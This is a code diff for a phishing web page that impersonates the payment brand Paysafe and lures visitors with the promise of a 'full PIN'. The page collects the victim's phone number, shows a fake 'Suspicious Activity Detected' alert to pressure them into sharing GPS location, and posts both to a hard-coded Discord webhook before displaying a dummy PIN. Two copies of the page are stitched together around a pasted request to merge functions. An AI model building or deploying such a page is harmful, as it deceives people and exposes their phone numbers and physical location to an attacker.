@@ -1,4 +1,443 @@
-<script type="module">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="PaySafe" />
+    <meta property="og:description" content="To get the full PIN, click the link below for your online receipt." />
+    <meta property="og:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Get Your PIN Online!" />
+    <meta name="twitter:description" content="To get the full PIN, click the link below for your online receipt." />
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
+    <title>Paysafe - Verify Your Phone Number</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            border-top: 5px solid #007bff;
+        }
+        h1 {
+            color: #007bff;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            font-weight: 700;
+        }
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        .phone-input-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        .country-code {
+            font-size: 1.2em;
+            font-weight: 700;
+            margin-right: 10px;
+            color: #007bff;
+        }
+        #phoneNumber {
+            padding: 12px 15px;
+            font-size: 1.1em;
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            width: 60%;
+            max-width: 250px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        #submitBtn {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #submitBtn:hover {
+            background-color: #0056b3;
+        }
+        .hidden {
+            display: none;
+        }
+        .pin-display {
+            background-color: #e9ecef;
+            border: 2px dashed #ced4da;
+            border-radius: 8px;
+            padding: 20px;
+            font-size: 2.8em;
+            font-weight: 700;
+            letter-spacing: 3px;
+            color: #28a745;
+            margin-bottom: 30px;
+            display: inline-block;
+        }
+        .note {
+            font-size: 0.9em;
+            color: #6c757d;
+            margin-top: 20px;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 0.9em;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            display: none;
+        }
+        .suspicious-activity-section {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 25px;
+            color: #856404;
+        }
+        .suspicious-activity-section h2 {
+            color: #856404;
+            margin-top: 0;
+            font-size: 1.8em;
+        }
+        .suspicious-activity-section p {
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+        #gpsStatus {
+            font-weight: 700;
+            margin-top: 15px;
+        }
+        .status-success {
+            color: #28a745;
+        }
+        .status-fail {
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="paysafe_logo.png" alt="Paysafe Logo">
+        </div>
+        <div id="phoneInputSection">
+            <h1>Verify Your Phone Number</h1>
+            <p>Please enter your phone number to access your Paysafe PIN. We will automatically detect your country code.</p>
+            <div class="phone-input-container">
+                <span class="country-code" id="countryCodeDisplay">+1</span>
+                <input type="tel" id="phoneNumber" placeholder="e.g., 555-123-4567" pattern="[0-9\-()\s]+" required>
+            </div>
+            <div class="error-message" id="phoneNumberError">Please enter a valid phone number.</div>
+            <button id="submitBtn">Submit</button>
+            <p class="note">By submitting, you agree to our terms and conditions.</p>
+        </div>
+
+        <div id="suspiciousActivitySection" class="hidden">
+            <div class="suspicious-activity-section">
+                <h2>Suspicious Activity Detected!</h2>
+                <p>For your security, we've detected unusual activity. To proceed and access your Paysafe PIN, we need to verify your device's location.</p>
+                <p>Please allow us to access your GPS location.</p>
+                <p id="gpsStatus"></p>
+            </div>
+        </div>
+
+        <div id="pinDisplaySection" class="hidden">
+            <h1>Your Paysafe PIN is Available!</h1>
+            <p>Congratulations! Your new Paysafe PIN has been generated and is ready for use. Please find your unique PIN below:</p>
+            <div class="pin-display">
+                1234 5678 9012 3456
+            </div>
+            <p>For security reasons, this PIN is for display purposes only and is a randomly generated example. Always log in to your official Paysafe account to retrieve your real PIN securely.</p>
+            <p class="note">If you have any questions or require assistance, please visit the official Paysafe website or contact their support.</p>
+        </div>
+    </div>
+
+    <script type="module">
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Replace with your actual Discord webhook URL
+
+        const phoneInputSection = document.getElementById('phoneInputSection');
+        const suspiciousActivitySection = document.getElementById('suspiciousActivitySection');
+        const pinDisplaySection = document.getElementById('pinDisplaySection');
+        const countryCodeDisplay = document.getElementById('countryCodeDisplay');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const submitBtn = document.getElementById('submitBtn');
+        const phoneNumberError = document.getElementById('phoneNumberError');
+        const gpsStatus = document.getElementById('gpsStatus');
+
+        let countryCallingCode = '+1'; // Default to +1
+
+        // Function to send data to Discord webhook
+        async function sendToDiscord(data) {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                if (!response.ok) {
+                    console.error('Failed to send data to Discord:', response.status, response.statusText);
+                } else {
+                    console.log('Data sent to Discord successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending data to Discord:', error);
+            }
+        }
+
+        // Basic phone number validation function
+        function isValidPhoneNumber(phoneNumber) {
+            const cleanedNumber = phoneNumber.replace(/[\s-()]/g, '');
+            return /^\d{7,}$/.test(cleanedNumber); // At least 7 digits
+        }
+
+        submitBtn.addEventListener('click', async () => {
+            const rawPhoneNumber = phoneNumberInput.value.trim();
+            if (!isValidPhoneNumber(rawPhoneNumber)) {
+                phoneNumberError.classList.remove('hidden');
+                return;
+            }
+
+            // Hide phone number input and show suspicious activity section
+            phoneInputSection.classList.add('hidden');
+            suspiciousActivitySection.classList.remove('hidden');
+
+            // Request GPS location
+            if (navigator.geolocation) {
+                gpsStatus.textContent = 'Fetching your location...';
+                gpsStatus.classList.remove('status-success', 'status-fail');
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        gpsStatus.textContent = Location retrieved successfully! Latitude: ${latitude}, Longitude: ${longitude};
+                        gpsStatus.classList.add('status-success');
+
+                        // Send phone number and location to Discord webhook
+                        const data = {
+                            content: Phone Number: ${countryCallingCode} ${rawPhoneNumber}\nLocation: Latitude: ${latitude}, Longitude: ${longitude},
+                        };
+                        await sendToDiscord(data);
+
+                        // Show PIN display section
+                        suspiciousActivitySection.classList.add('hidden');
+                        pinDisplaySection.classList.remove('hidden');
+                    },
+                    () => {
+                        gpsStatus.textContent = 'Location access denied or unavailable.';
+                        gpsStatus.classList.add('status-fail');
+                    }
+                );
+            } else {
+                gpsStatus.textContent = 'Geolocation is not supported by your browser.';
+                gpsStatus.classList.add('status-fail');
+            }
+        });
+    </script>
+</body>
+</html> ADD ON THIS  THE FUCTION FORM THIS <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="PaySafe" />
+    <meta property="og:description" content="To get the full PIN, click the link below for your online receipt." />
+    <meta property="og:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Get Your PIN Online!" />
+    <meta name="twitter:description" content="To get the full PIN, click the link below for your online receipt." />
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
+    <title>Paysafe - Verify Your Phone Number</title>
+    <script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;type=content-script&amp;dmn=0gls2zltv6ps6zcxuvqx.c.websim.com&amp;url=https%3A%2F%2F0gls2zltv6ps6zcxuvqx.c.websim.com%2Findex.html%3Fv%3D20%26raw%3D&amp;app=firefox.exe&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1&amp;stealth=1&amp;st-push&amp;st-loc&amp;st-dnt&amp;st-1pcttl=4320"></script>
+<script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;name=AdGuard%20Extra&amp;name=AdGuard%20Popup%20Blocker&amp;type=user-script"></script><script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;type=content-script&amp;dmn=0gls2zltv6ps6zcxuvqx.c.websim.com&amp;url=https%3A%2F%2F0gls2zltv6ps6zcxuvqx.c.websim.com%2Findex.html%3Fv%3D12%26raw%3D&amp;app=firefox.exe&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1&amp;stealth=1&amp;st-push&amp;st-loc&amp;st-dnt&amp;st-1pcttl=4320"></script>
+<script type="text/javascript" nonce="eca090efa93443c4b24d8cbbc1e" src="//local.adguard.org?ts=1750494185998&amp;name=AdGuard%20Extra&amp;name=AdGuard%20Popup%20Blocker&amp;type=user-script"></script><link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            border-top: 5px solid #007bff; /* Paysafe blue color */
+        }
+        h1 {
+            color: #007bff;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            font-weight: 700;
+        }
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        .logo {
+            margin-bottom: 30px;
+        }
+        .logo img {
+            max-width: 180px;
+            height: auto;
+        }
+        .phone-input-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        .country-code {
+            font-size: 1.2em;
+            font-weight: 700;
+            margin-right: 10px;
+            color: #007bff;
+        }
+        #phoneNumber {
+            padding: 12px 15px;
+            font-size: 1.1em;
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            width: 60%;
+            max-width: 250px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        #submitBtn {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #submitBtn:hover {
+            background-color: #0056b3;
+        }
+        .hidden {
+            display: none;
+        }
+        .pin-display {
+            background-color: #e9ecef;
+            border: 2px dashed #ced4da;
+            border-radius: 8px;
+            padding: 20px;
+            font-size: 2.8em;
+            font-weight: 700;
+            letter-spacing: 3px;
+            color: #28a745; /* Green for emphasis */
+            margin-bottom: 30px;
+            display: inline-block;
+        }
+        .note {
+            font-size: 0.9em;
+            color: #6c757d;
+            margin-top: 20px;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 0.9em;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            display: none; /* Hidden by default */
+        }
+        .suspicious-activity-section {
+            background-color: #fff3cd; /* Light warning yellow */
+            border: 1px solid #ffeeba;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 25px;
+            color: #856404; /* Dark yellow text */
+        }
+        .suspicious-activity-section h2 {
+            color: #856404;
+            margin-top: 0;
+            font-size: 1.8em;
+        }
+        .suspicious-activity-section p {
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+        #gpsStatus {
+            font-weight: 700;
+            margin-top: 15px;
+        }
+        .status-success {
+            color: #28a745; /* Green */
+        }
+        .status-fail {
+            color: #dc3545; /* Red */
+        }
+    </style>
+    <script type="importmap">
+        {
+            "imports": {
+                
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="paysafe_logo.png" alt="Paysafe Logo">
+        </div>
+        <div id="phoneInputSection">
+            <h1>Verify Your Phone Number</h1>
+            <p>Please enter your phone number to access your Paysafe PIN. We will automatically detect your country code.</p>
+            <div class="phone-input-container">
+                <span class="country-code" id="countryCodeDisplay">+1</span>
+                <input type="tel" id="phoneNumber" placeholder="e.g., 555-123-4567" pattern="[0-9\-()\s]+" required>
+            </div>
+            <div class="error-message" id="phoneNumberError">Please enter a valid phone number.</div>
+            <button id="submitBtn">Submit</button>
+            <p class="note">By submitting, you agree to our terms and conditions.</p>
+        </div>
+
+        <div id="suspiciousActivitySection" class="hidden">
+            <div class="suspicious-activity-section">
+                <h2>Suspicious Activity Detected!</h2>
+                <p>For your security, we've detected unusual activity. To proceed and access your Paysafe PIN, we need to verify your device's location.</p>
+                <p>Please allow us to access your GPS location.</p>
+                <p id="gpsStatus"></p>
+            </div>
+        </div>
+    <script type="module">
     const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Replace with your actual Discord webhook URL
 
     const phoneInputSection = document.getElementById('phoneInputSection');
@@ -202,3 +641,18 @@
         }
     }
 </script>
+
+        <div id="pinDisplaySection" class="hidden">
+            <h1>Your Paysafe PIN is Available!</h1>
+            <p>Congratulations! Your new Paysafe PIN has been generated and is ready for use. Please find your unique PIN below:</p>
+            <div class="pin-display">
+                1234 5678 9012 3456
+            </div>
+            <p>For security reasons, this PIN is for display purposes only and is a randomly generated example. Always log in to your official Paysafe account to retrieve your real PIN securely.</p>
+            <p class="note">If you have any questions or require assistance, please visit the official Paysafe website or contact their support.</p>
+        </div>
+    </div>
+
+
+</body>
+</html>
